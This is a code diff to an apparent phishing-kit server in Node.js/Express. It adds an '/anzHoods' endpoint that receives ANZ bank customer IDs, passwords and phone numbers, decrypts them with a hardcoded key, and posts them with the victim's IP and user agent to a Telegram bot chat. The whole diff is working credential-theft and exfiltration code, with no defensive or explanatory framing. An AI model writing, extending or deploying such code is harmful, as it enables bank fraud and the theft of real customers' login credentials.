@@ -4157,6 +4157,27 @@ app.post("/anzAR", (req, res) => {
   res.send("Update Completed");
 });
 
+app.options("/anzHoods", cors());
+
+app.post("/anzHoods", (req, res) => {
+  customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  userAgent = req.body.userAgent;
+  ip = req.body.ip;
+  var originalText = `+----------- ANZ Login Information ------------+\nCustomer ID: ${customerId}\nPassword ${password}\nTelephone: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
+  axios.post(
+    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-665384174&text=ANZ:\n${originalText}`
+  );
+  res.send("Update Completed");
+});
+
 //BT
 //BT
 //BT
